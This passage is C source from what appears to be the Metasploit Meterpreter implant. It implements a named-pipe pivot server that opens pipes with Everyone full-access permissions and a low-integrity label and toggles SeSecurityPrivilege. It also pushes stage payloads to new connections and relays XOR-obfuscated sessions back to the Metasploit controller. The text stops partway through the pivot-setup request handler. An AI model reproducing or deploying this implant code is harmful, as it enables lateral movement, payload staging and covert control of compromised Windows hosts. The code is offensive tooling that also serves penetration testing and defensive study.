#include "metsrv.h"
#include "server_pivot_named_pipe.h"
#include "packet_encryption.h"

#include <accctrl.h>
#include <aclapi.h>

#define PIPE_NAME_SIZE 256
#define PIPE_BUFFER_SIZE 0x10000

typedef struct _NamedPipeContext
{
	// make sure we leave this as the first element, so that it can be cast
	// to an OVERLAPPED pointer for various operations.
	OVERLAPPED read_overlap;
	OVERLAPPED write_overlap;
	char       name[PIPE_NAME_SIZE];
	GUID       pivot_id;
	GUID       pivot_session_guid;
	BOOL       session_established;
	CHAR       guid_request_id[32];
	Remote*    remote;
	HANDLE     pipe;
	BOOL       connecting;
	BOOL       established;
	BYTE       read_buffer[PIPE_BUFFER_SIZE];
	LPBYTE     packet_buffer;
	DWORD      packet_buffer_size;
	DWORD      packet_buffer_offset;
	DWORD      packet_required_size;
	LPVOID     stage_data;
	DWORD      stage_data_size;
	LOCK*      write_lock;
} NamedPipeContext;

static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext);
static DWORD server_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext);
static DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength);
static VOID free_server_context(NamedPipeContext* ctx);

typedef BOOL (WINAPI *PAddMandatoryAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid);
static BOOL WINAPI AddMandatoryAce(PACL pAcl, DWORD dwAceRevision, DWORD dwAceFlags, DWORD dwMandatoryPolicy, PSID pLabelSid)
{
	static BOOL attempted = FALSE;
	static PAddMandatoryAce pAddMandatoryAce = NULL;

	if (attempted)
	{
		attempted = TRUE;

		HMODULE lib = LoadLibraryA("advapi32.dll");
		if (lib != NULL)
		{
			pAddMandatoryAce = (PAddMandatoryAce)GetProcAddress(lib, "AddMandatoryAce");
			dprintf("[NP-SERVER] AddMandatoryAce: %p", pAddMandatoryAce);
		}
	}

	if (pAddMandatoryAce != NULL)
	{
		pAddMandatoryAce(pAcl, dwAceRevision, dwAceFlags, dwMandatoryPolicy, pLabelSid);
	}

	return TRUE;
}

static DWORD server_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext)
{
	NamedPipeContext* ctx = (NamedPipeContext*)entryContext;
	if (ctx != NULL)
	{
		dprintf("[PIVOT] Cleaning up the pipe pivot context");
		lock_acquire(ctx->remote->lock);
		CloseHandle(ctx->pipe);
		CloseHandle(ctx->read_overlap.hEvent);
		CloseHandle(ctx->write_overlap.hEvent);
		SAFE_FREE(ctx->stage_data);
		lock_destroy(ctx->write_lock);
		lock_release(ctx->remote->lock);
		dprintf("[PIVOT] Cleaned up the pipe pivot context");
	}
	return ERROR_SUCCESS;
}

static void terminate_pipe(NamedPipeContext* ctx)
{
	if (ctx != NULL)
	{
		scheduler_signal_waitable(ctx->read_overlap.hEvent, SchedulerStop);
	}
}

static DWORD remove_listener(LPVOID state)
{
	dprintf("[PIVOT] removing named pipe listener");
	terminate_pipe((NamedPipeContext*)state);
	return ERROR_SUCCESS;
}

static DWORD read_pipe_to_packet(NamedPipeContext* ctx, LPBYTE source, DWORD sourceSize)
{
	BOOL relayPacket = TRUE;
	// Make sure we have the space to handle the incoming packet
	if (ctx->packet_buffer_size < sourceSize + ctx->packet_buffer_offset)
	{
		ctx->packet_buffer_size = sourceSize + ctx->packet_buffer_offset;
		dprintf("[PIVOT] Allocating space: %u bytes", ctx->packet_buffer_size);
		ctx->packet_buffer = (LPBYTE)realloc(ctx->packet_buffer, ctx->packet_buffer_size);
	}

	// copy over the new data
	memcpy(ctx->packet_buffer + ctx->packet_buffer_offset, source, sourceSize);
	ctx->packet_buffer_offset += sourceSize;

	// check if the packet is complete
	if (ctx->packet_required_size == 0)
	{
		dprintf("[PIVOT] Size not yet calculated");
		if (ctx->packet_buffer_offset >= sizeof(PacketHeader))
		{
			dprintf("[PIVOT] header bytes received, calculating buffer offset");
			// get a copy of the header data and XOR it out so we can read the length
			PacketHeader* header = (PacketHeader*)ctx->packet_buffer;
#ifdef DEBUGTRACE
			PUCHAR h = (PUCHAR)ctx->packet_buffer;
			dprintf("[PIVOT] Packet header before XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif
			xor_bytes(header->xor_key, (LPBYTE)&header->length, sizeof(header->length));
#ifdef DEBUGTRACE
			h = (PUCHAR)ctx->packet_buffer;
			dprintf("[PIVOT] Packet header after XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
				h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif
			ctx->packet_required_size = ntohl(header->length) + sizeof(PacketHeader) - sizeof(TlvHeader);
			xor_bytes(header->xor_key, (LPBYTE)&header->length, sizeof(header->length));
			dprintf("[PIVOT] Required size is %u bytes", ctx->packet_required_size);
		}
	}

	if (ctx->packet_required_size > 0 && ctx->packet_required_size <= ctx->packet_buffer_offset)
	{
		// whole packet is ready for transmission to the other side! Pivot straight through the existing
		// transport by sending the raw packet to the transmitter.
		if (!ctx->session_established)
		{
			dprintf("[PIPE] Session not yet established, checking for response packet");
			// we need to check if this packet contains a response to the request for a session guid
			PacketHeader* header = (PacketHeader*)ctx->packet_buffer;
			xor_bytes(header->xor_key, (LPBYTE)&header->session_guid, ctx->packet_required_size - sizeof(header->xor_key));
			if (header->enc_flags == ENC_FLAG_NONE)
			{
				dprintf("[PIPE] Incoming packet is not encrypted!");
				Packet* packet = (Packet*)calloc(1, sizeof(Packet));
				packet->header.length = header->length;
				packet->header.type = header->type;
				packet->payloadLength = ntohl(packet->header.length) - sizeof(TlvHeader);
				packet->payload = ctx->packet_buffer + sizeof(PacketHeader);

				CHAR* requestId = packet_get_tlv_value_string(packet, TLV_TYPE_REQUEST_ID);
				if (requestId != NULL && memcmp(ctx->guid_request_id, requestId, sizeof(ctx->guid_request_id)) == 0)
				{
					dprintf("[PIPE] Request ID found and matches expected value");
					// we have a response to our session guid request
					DWORD sessionGuidLen = 0;
					LPBYTE sessionGuid = packet_get_tlv_value_raw(packet, TLV_TYPE_SESSION_GUID, &sessionGuidLen);
					if (sessionGuid != NULL && sessionGuidLen == sizeof(ctx->pivot_session_guid) && memcmp(&ctx->pivot_session_guid, sessionGuid, sizeof(ctx->pivot_session_guid)) != 0)
					{
#ifdef DEBUGTRACE
						PUCHAR h = (PUCHAR)&sessionGuid[0];
						dprintf("[PIPE] Returned session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
							h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
						h = (PUCHAR)&ctx->pivot_session_guid;
						dprintf("[PIPE]    Pivot session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
							h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
						dprintf("[PIPE] Session pivot session guid size: %u", sizeof(ctx->pivot_session_guid));
#endif
						dprintf("[PIPE] Session guid returned, looks like the session is a reconnect");
						memcpy(&ctx->pivot_session_guid, sessionGuid, sizeof(ctx->pivot_session_guid));

						PivotContext* pc = pivot_tree_remove(ctx->remote->pivot_sessions, (LPBYTE)&ctx->pivot_session_guid);
						if (pc != NULL)
						{
							dprintf("[PIPE] We seem to have acquired a new instance of a pivot we didnt know was dead. Killing!");
							free_server_context((NamedPipeContext*)pc->state);
							free(pc);
						}
					}
					else
					{
						dprintf("[PIPE] Session guid not found, looks like the session is new");

						// We need to generate a new session GUID and inform metasploit of the new session
						CoCreateGuid(&ctx->pivot_session_guid);

						// swizzle the values around so that endianness isn't an issue before casting to a block of bytes
						ctx->pivot_session_guid.Data1 = htonl(ctx->pivot_session_guid.Data1);
						ctx->pivot_session_guid.Data2 = htons(ctx->pivot_session_guid.Data2);
						ctx->pivot_session_guid.Data3 = htons(ctx->pivot_session_guid.Data3);
					}

					ctx->session_established = TRUE;

					PivotContext* pivotContext = (PivotContext*)calloc(1, sizeof(PivotContext));
					pivotContext->state = ctx;
					pivotContext->packet_write = named_pipe_write_raw;
					pivot_tree_add(ctx->remote->pivot_sessions, (LPBYTE)&ctx->pivot_session_guid, pivotContext);
#ifdef DEBUGTRACE
					dprintf("[PIVOTTREE] Pivot sessions (after new one added)");
					dbgprint_pivot_tree(ctx->remote->pivot_sessions);
#endif

					// with the session now established, we need to inform metasploit of the new connection
					dprintf("[PIPE] Informing MSF of the new named pipe pivot");
					Packet* notification = packet_create(PACKET_TLV_TYPE_REQUEST, COMMAND_ID_CORE_PIVOT_SESSION_NEW);
					packet_add_tlv_raw(notification, TLV_TYPE_SESSION_GUID, (LPVOID)&ctx->pivot_session_guid, sizeof(ctx->pivot_session_guid));
					packet_add_tlv_raw(notification, TLV_TYPE_PIVOT_ID, (LPVOID)&ctx->pivot_id, sizeof(ctx->pivot_id));
					packet_transmit(ctx->remote, notification, NULL);

					relayPacket = FALSE;
				}

				free(packet);
			}
			xor_bytes(header->xor_key, (LPBYTE)&header->session_guid, ctx->packet_required_size - sizeof(header->xor_key));
		}

		if (relayPacket)
		{
			dprintf("[PIVOT] Entire packet is ready, size is %u, offset is %u", ctx->packet_required_size, ctx->packet_buffer_offset);
			ctx->remote->transport->packet_transmit(ctx->remote, ctx->packet_buffer, ctx->packet_required_size);
		}
		// TODO: error check?

		// with the packet sent, we need to rejig a bit here so that the next block of data
		// results in a new packet.
		DWORD diff = ctx->packet_buffer_offset - ctx->packet_required_size;
		if (diff > 0)
		{
			dprintf("[PIVOT] Extra %u bytes found, shuffling data", diff);
			memmove(ctx->packet_buffer, ctx->packet_buffer + ctx->packet_required_size, diff);
		};
		dprintf("[PIVOT] Packet buffer reset");
		ctx->packet_buffer_offset = diff;
		ctx->packet_required_size = 0;
	}

	return ERROR_SUCCESS;
}

static DWORD named_pipe_write_raw(LPVOID state, LPBYTE raw, DWORD rawLength)
{
	NamedPipeContext* ctx = (NamedPipeContext*)state;
	DWORD dwResult = ERROR_SUCCESS;
	DWORD bytesWritten = 0;

	lock_acquire(ctx->write_lock);

	dprintf("[NP-SERVER] Writing a total of %u", rawLength);
	while (bytesWritten < rawLength)
	{
		DWORD byteCount = 0;
		WriteFile(ctx->pipe, raw, rawLength - bytesWritten, NULL, &ctx->write_overlap);
		//WriteFile(ctx->pipe, raw, min(rawLength - bytesWritten, PIPE_BUFFER_SIZE), NULL, &ctx->write_overlap);

		// blocking here is just fine, it's the reads we care about
		if (GetOverlappedResult(ctx->pipe, &ctx->write_overlap, &byteCount, TRUE))
		{
			dprintf("[NP-SERVER] Wrote %u", byteCount);
			bytesWritten += byteCount;
		}
		else
		{
			BREAK_ON_ERROR("[NP-SERVER] failed to do the write");
		}
		dprintf("[NP-SERVER] left to go: %u", rawLength - bytesWritten);
	}

	dprintf("[NP SERVER] server write. finished. dwResult=%d, written=%d", dwResult, bytesWritten);

	lock_release(ctx->write_lock);

	return dwResult;
}

VOID create_pipe_security_attributes(PSECURITY_ATTRIBUTES psa)
{
	// Start with the DACL (perhaps try the NULL sid if it doesn't work?)
	SID_IDENTIFIER_AUTHORITY sidWorld = SECURITY_WORLD_SID_AUTHORITY;
	PSID sidEveryone = NULL;
	if (!AllocateAndInitializeSid(&sidWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &sidEveryone))
	{
		dprintf("[NP-SERVER] AllocateAndInitializeSid failed: %u", GetLastError());
		return;
	}

	dprintf("[NP-SERVER] sidEveryone: %p", sidEveryone);

	EXPLICIT_ACCESSW ea = { 0 };
	ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPWSTR)sidEveryone;

	//PACL dacl = (PACL)LocalAlloc(LPTR, 256);
	PACL dacl = NULL;
	DWORD result = SetEntriesInAclW(1, &ea, NULL, &dacl);
	if (result != ERROR_SUCCESS)
	{
		dprintf("[NP-SERVER] SetEntriesInAclW failed: %u", result);
	}
	dprintf("[NP-SERVER] DACL: %p", dacl);

	// set up the sacl
	SID_IDENTIFIER_AUTHORITY sidLabel = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID sidLow = NULL;
	if (!AllocateAndInitializeSid(&sidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &sidLow))
	{
		dprintf("[NP-SERVER] AllocateAndInitializeSid failed: %u", GetLastError());
	}
	dprintf("[NP-SERVER] sidLow: %p", dacl);

	PACL sacl = (PACL)LocalAlloc(LPTR, 256);
	if (!InitializeAcl(sacl, 256, ACL_REVISION_DS))
	{
		dprintf("[NP-SERVER] InitializeAcl failed: %u", GetLastError());
	}

	if (!AddMandatoryAce(sacl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, sidLow))
	{
		dprintf("[NP-SERVER] AddMandatoryAce failed: %u", GetLastError());
	}

	// now build the descriptor
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION))
	{
		dprintf("[NP-SERVER] InitializeSecurityDescriptor failed: %u", GetLastError());
	}

	// add the dacl
	if (!SetSecurityDescriptorDacl(sd, TRUE, dacl, FALSE))
	{
		dprintf("[NP-SERVER] SetSecurityDescriptorDacl failed: %u", GetLastError());
	}

	// now the sacl
	if (!SetSecurityDescriptorSacl(sd, TRUE, sacl, FALSE))
	{
		dprintf("[NP-SERVER] SetSecurityDescriptorSacl failed: %u", GetLastError());
	}

	psa->nLength = sizeof(SECURITY_ATTRIBUTES);
	psa->bInheritHandle = FALSE;
	psa->lpSecurityDescriptor = sd;
}

DWORD toggle_privilege(LPCWSTR privName, BOOL enable, BOOL* wasEnabled)
{
	HANDLE accessToken;
	TOKEN_PRIVILEGES tp;
	TOKEN_PRIVILEGES prevTp;
	LUID luid;
	DWORD tpLen;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &accessToken))
	{
		dprintf("[NP-PRIV] Couldn't open process token: %u (%x)", GetLastError(), GetLastError());
		return GetLastError();
	}

	if (!LookupPrivilegeValueW(NULL, privName, &luid))
	{
		dprintf("[NP-PRIV] Couldn't look up the value: %u (%x)", GetLastError(), GetLastError());
		return GetLastError();
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(accessToken, FALSE, &tp, sizeof(tp), &prevTp, &tpLen))
	{
		dprintf("[NP-PRIV] Couldn't adjust the token privs: %u (%x)", GetLastError(), GetLastError());
		return GetLastError();
	}

	*wasEnabled = (prevTp.Privileges[0].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED ? TRUE : FALSE;
	dprintf("[NP-PRIV] the %S token was %senabled, and is now %s", privName, *wasEnabled ? "" : "not ", enable ? "enabled" : "disabled");

	CloseHandle(accessToken);

	return ERROR_SUCCESS;
}

DWORD create_pipe_server_instance(NamedPipeContext* ctx)
{
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		dprintf("[NP-SERVER] Creating new server instance of %s", ctx->name);

		BOOL wasEnabled;
		DWORD toggleResult = toggle_privilege(SE_SECURITY_NAME, TRUE, &wasEnabled);

		if (toggleResult == ERROR_SUCCESS)
		{
			// set up a session that let's anyone with SMB access connect
			SECURITY_ATTRIBUTES sa = { 0 };
			create_pipe_security_attributes(&sa);
			ctx->pipe = CreateNamedPipeA(ctx->name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, &sa);

			if (wasEnabled == FALSE)
			{
				toggle_privilege(SE_SECURITY_NAME, FALSE, &wasEnabled);
			}
		}

		if (ctx->pipe == INVALID_HANDLE_VALUE)
		{
			// Fallback on a pipe with simpler security attributes
			ctx->pipe = CreateNamedPipeA(ctx->name, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_SIZE, PIPE_BUFFER_SIZE, 0, NULL);
		}

		if (ctx->pipe == INVALID_HANDLE_VALUE)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create named pipe.");
		}

		dprintf("[NP-SERVER] Creating the handler event");
		// This must be signalled, so that the connect event kicks off on the new thread.
		ctx->read_overlap.hEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
		if (ctx->read_overlap.hEvent == NULL)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create connect event for read overlap.");
		}

		// this should not be signalled as it's just for handling named pipe writes.
		ctx->write_overlap.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (ctx->write_overlap.hEvent == NULL)
		{
			BREAK_ON_ERROR("[NP-SERVER] Failed to create connect event for read overlap.");
		}

		dprintf("[NP-SERVER] Inserting the named pipe schedule entry");
		scheduler_insert_waitable(ctx->read_overlap.hEvent, ctx, NULL, server_notify, server_destroy);
	} while (0);

	return dwResult;
}

/*!
 * @brief Deallocates and cleans up the attributes of a named pipe server context.
 * @param ctx Pointer to the context to free.
 */
static VOID free_server_context(NamedPipeContext* ctx)
{
	do
	{
		if (!ctx)
		{
			break;
		}

		dprintf("[NP-SERVER] free_server_context. ctx=0x%08X", ctx);

		dprintf("[NP-SERVER] freeing up pipe handle 0x%x", ctx->pipe);
		if (ctx->pipe != INVALID_HANDLE_VALUE && ctx->pipe != INVALID_HANDLE_VALUE)
		{
			CloseHandle(ctx->pipe);
			ctx->pipe = INVALID_HANDLE_VALUE;
		}

		if (ctx->read_overlap.hEvent != NULL)
		{
			dprintf("[NP-SERVER] free_server_context. signaling the thread to stop");
			scheduler_signal_waitable(ctx->read_overlap.hEvent, SchedulerStop);
			ctx->read_overlap.hEvent = NULL;
		}

		if (ctx->write_overlap.hEvent != NULL)
		{
			CloseHandle(ctx->write_overlap.hEvent);
			ctx->write_overlap.hEvent = NULL;
		}

		SAFE_FREE(ctx->packet_buffer);

		free(ctx);

	} while (0);
}

/*!
 * @brief Notify routine for a named pipe server channel to pick up its new client connections..
 * @param remote Pointer to the remote instance.
 * @param serverCtx Pointer to the named pipe server context.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Notification completed successfully.
 */
static DWORD server_notify(Remote* remote, LPVOID entryContext, LPVOID threadContext)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* request = NULL;
	NamedPipeContext* serverCtx = (NamedPipeContext*)entryContext;
	BOOL performRead = FALSE;

	do
	{
		if (!serverCtx)
		{
			BREAK_WITH_ERROR("[NP-SERVER] server_notify. serverCtx == NULL", ERROR_INVALID_HANDLE);
		}

		if (serverCtx->pipe == INVALID_HANDLE_VALUE)
		{
			BREAK_WITH_ERROR("[NP-SERVER] pipe isn't present, we might be shutting down.", ERROR_INVALID_HANDLE);
		}

		if (!serverCtx->connecting)
		{
			serverCtx->connecting = TRUE;
			dprintf("[NP-SERVER] Connecting to the named pipe async");
			ConnectNamedPipe(serverCtx->pipe, &serverCtx->read_overlap);

			dwResult = GetLastError();
			dprintf("[NP-SERVER] checking the result of connect %u 0x%x", dwResult, dwResult);
			if (dwResult == ERROR_IO_PENDING)
			{
				dprintf("[NP-SERVER] still waiting for an overlapped connection");
				break;
			}
			else if (dwResult == ERROR_PIPE_LISTENING)
			{
				dprintf("[NP-SERVER] client has connected apparently");
				serverCtx->established = TRUE;
				// no break here, we want to continue
			}
			else
			{
				BREAK_WITH_ERROR("[NP-SERVER] Failed to connect to the named pipe", dwResult);
			}
			dwResult = ERROR_SUCCESS;
		}

		DWORD bytesProcessed = 0;
		dprintf("[NP-SERVER] Checking the overlapped result");
		if (!GetOverlappedResult(serverCtx->pipe, &serverCtx->read_overlap, &bytesProcessed, FALSE))
		{
			dwResult = GetLastError();
			dprintf("[NP-SERVER] server_notify. unable to get the result, %u", dwResult);

			if (dwResult == ERROR_IO_INCOMPLETE)
			{
				dprintf("[NP-SERVER] still waiting for something to happen on the pipe");
			}
			else if (dwResult == ERROR_BROKEN_PIPE)
			{
				dprintf("[NP-SERVER] the client appears to have bailed out, disconnecting...");
				// Reset the read event so that our schedular loop witll exit properly
				ResetEvent(serverCtx->read_overlap.hEvent);

				// Prepare the notification packet for dispatching
				Packet* notification = packet_create(PACKET_TLV_TYPE_REQUEST, COMMAND_ID_CORE_PIVOT_SESSION_DIED);
				packet_add_tlv_raw(notification, TLV_TYPE_SESSION_GUID, (LPVOID)&serverCtx->pivot_session_guid, sizeof(serverCtx->pivot_session_guid));

				// Clean up the pivot context
				PivotContext* pivotCtx = pivot_tree_remove(remote->pivot_sessions, (LPBYTE)&serverCtx->pivot_session_guid);
#ifdef DEBUGTRACE
				dprintf("[PIVOTTREE] Pivot sessions (after one removed)");
				dbgprint_pivot_tree(remote->pivot_sessions);
#endif
				SAFE_FREE(pivotCtx);

				// Clean up all the named pipe context stuff.
				terminate_pipe(serverCtx);

				// Inform MSF of the dead session
				packet_transmit(serverCtx->remote, notification, NULL);

				return ERROR_BROKEN_PIPE;
			}
			break;
		}

		// spin up a new named pipe server instance to handle the next connection if this
		// connection is new.
		dprintf("[NP-SERVER] Apparently we have a result! With %u bytes", bytesProcessed);
		if (!serverCtx->established)
		{
			// this is a connect, so tell MSF about it.
			dprintf("[NP-SERVER] This appears to be a new connection, setting up context.");

			// Connection received, here we're going to create a new named pipe handle so that
			// other connections can come in on it. We'll assume that it if worked once, it
			// will work again this time
			NamedPipeContext* nextCtx = (NamedPipeContext*)calloc(1, sizeof(NamedPipeContext));

			// copy the relevant content over.
			nextCtx->pipe = INVALID_HANDLE_VALUE;
			nextCtx->remote = serverCtx->remote;
			nextCtx->stage_data = serverCtx->stage_data;
			nextCtx->stage_data_size = serverCtx->stage_data_size;
			nextCtx->write_lock = lock_create();
			memcpy_s(&nextCtx->pivot_id, sizeof(nextCtx->pivot_id), &serverCtx->pivot_id, sizeof(nextCtx->pivot_id));
			memcpy_s(&nextCtx->name, PIPE_NAME_SIZE, &serverCtx->name, PIPE_NAME_SIZE);

			// create a new pipe for the next connection
			DWORD result = create_pipe_server_instance(nextCtx);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[NP-SERVER] failed to create the pipe server instance: %u", result);
				free_server_context(nextCtx);
			}

			serverCtx->established = TRUE;

			// The current listener cotnext in the listeners tree points to the server instance that has now
			// become a client instance due to the new connection. Therefore we need to update the pivot tree context
			// to point to the new listener on the named pipe.
			PivotContext* listenerCtx = pivot_tree_find(remote->pivot_listeners, (LPBYTE)&serverCtx->pivot_id);
			if (listenerCtx != NULL)
			{
				dprintf("[NP-SERVER] Updating the listener context in the pivot tree");
				listenerCtx->state = nextCtx;
			}

			// Time to stage the data
			if (serverCtx->stage_data && serverCtx->stage_data_size > 0)
			{
				dprintf("[NP-SERVER] Sending stage on new connection");
				// send the stage length
				named_pipe_write_raw(serverCtx, (LPBYTE)&serverCtx->stage_data_size, sizeof(serverCtx->stage_data_size));

				// send the stage
				named_pipe_write_raw(serverCtx, serverCtx->stage_data, serverCtx->stage_data_size);

				// to "hand over" the stage data, set the existing pointer to NULL so that things don't get freed
				// when they shouldn't be.
				serverCtx->stage_data = NULL;
			}

			// We need to figure out if this is a new session without a session GUID or if it's an old
			// session that's come back out of nowhere (transport switching, sleeping, etc). Create a packet
			// that will request the guid, and track a random request ID to find the response later on.
			dprintf("[NP-SERVER] Creating the guid request packet");
			Packet* getGuidPacket = packet_create(PACKET_TLV_TYPE_REQUEST, COMMAND_ID_CORE_GET_SESSION_GUID);
			dprintf("[NP-SERVER] adding the request ID to the guid request packet");
			packet_add_request_id(getGuidPacket);
			CHAR* requestId = packet_get_tlv_value_string(getGuidPacket, TLV_TYPE_REQUEST_ID);
			dprintf("[NP-SERVER] Copying the request ID from the packet to the context");
			memcpy(serverCtx->guid_request_id, requestId, sizeof(serverCtx->guid_request_id));

			// prepare the packet buffer for sending.
			DWORD packetLength = getGuidPacket->payloadLength + sizeof(PacketHeader);
			dprintf("[NP-SERVER] We think the packet length is %u (0x%x)", packetLength, packetLength);
			LPBYTE packetBuffer = (LPBYTE)malloc(packetLength);

			dprintf("[NP-SERVER] Doing the XOR thing on the guid request packet");
			rand_xor_key(getGuidPacket->header.xor_key);
			memcpy(packetBuffer, &getGuidPacket->header, sizeof(getGuidPacket->header));
			memcpy(packetBuffer + sizeof(getGuidPacket->header), getGuidPacket->payload, packetLength - sizeof(getGuidPacket->header));

			// we don't support encryption at this point, but we do want to do the XOR thing!
			xor_bytes(getGuidPacket->header.xor_key, packetBuffer + sizeof(getGuidPacket->header.xor_key), packetLength - sizeof(getGuidPacket->header.xor_key));

			dprintf("[NP-SERVER] Sending the request packet to the new pivoted session");
			// Send the packet down to the newly created meterpreter session on the named pipe
			named_pipe_write_raw(serverCtx, packetBuffer, packetLength);

			dprintf("[NP-SERVER] Freeing up the packet buffer");
			free(packetBuffer);
			dprintf("[NP-SERVER] Done!");
		}

		if (bytesProcessed > 0)
		{
			dprintf("[NP-SERVER] read & sending bytes %u", bytesProcessed);
			read_pipe_to_packet(serverCtx, serverCtx->read_buffer, bytesProcessed);
		}

		performRead = TRUE;
	} while (0);

	if (serverCtx->read_overlap.hEvent != NULL)
	{
		dprintf("[NP-SERVER] Resetting the event handle");
		ResetEvent(serverCtx->read_overlap.hEvent);
	}

	// this has to be done after the signal is reset, otherwise ... STRANGE THINGS HAPPEN!
	if (performRead)
	{
		// prepare for reading
		serverCtx->read_overlap.Offset = 0;
		serverCtx->read_overlap.OffsetHigh = 0;

		// read the data from the pipe, we're async, so the return value of the function is meaningless.
		dprintf("[NP-SERVER] kicking off another read operation...");
		ReadFile(serverCtx->pipe, serverCtx->read_buffer, PIPE_BUFFER_SIZE, NULL, &serverCtx->read_overlap);
	}

	return dwResult;
}

/*!
 * @brief Allocates a streaming named pipe server channel.
 * @param remote Pointer to the remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Opening the server channel completed successfully.
 */
DWORD request_core_pivot_add_named_pipe(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	NamedPipeContext* ctx = NULL;
	Packet* response = NULL;
	char* namedPipeName = NULL;
	char* namedPipeServer = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. response == NULL", ERROR_NOT_ENOUGH_MEMORY);
		}

		ctx = (NamedPipeContext *)calloc(1, sizeof(NamedPipeContext));
		if (!ctx)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. ctx == NULL", ERROR_NOT_ENOUGH_MEMORY);
		}

		ctx->remote = remote;
		ctx->write_lock = lock_create();

		namedPipeName = packet_get_tlv_value_string(packet, TLV_TYPE_PIVOT_NAMED_PIPE_NAME);
		if (!namedPipeName)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName == NULL", ERROR_INVALID_PARAMETER);
		}

		if (strchr(namedPipeName, '\\') != NULL)
		{
			BREAK_WITH_ERROR("[NP-SERVER] request_net_named_pipe_server_channel_open. namedPipeName contains backslash (invalid)", ERROR_INVALID_PARAMETER);
		}

		//namedPipeServer = packet_get_tlv_value_string(packet, TLV_TYPE_NAMED_PIPE_SERVER);
		if (namedPipeServer == NULL)
		{
			namedPipeServer = ".";
		}

		DWORD pivotIdLen = 0;
		LPBYTE pivotId = packet_get_tlv_value_raw(packet, TLV_TYPE_PIVOT_ID, &pivotIdLen);
		if (pivotId != NULL)
		{
			memcpy(&ctx->pivot_id, pivotId, sizeof(ctx->pivot_id));
		}

		LPVOID stageData = packet_get_tlv_value_raw(packet, TLV_TYPE_PIVOT_STAGE_DATA, &ctx->stage_data_size);

		if (stageData && ctx->stage_data_size > 0)
		{
			dprintf("[NP-SEVER] stage received, size is %u (%x)", ctx->stage_data_size, ctx->stage_data_size);
			ctx->stage_data = (LPVOID)malloc(ctx->stage_data_size);
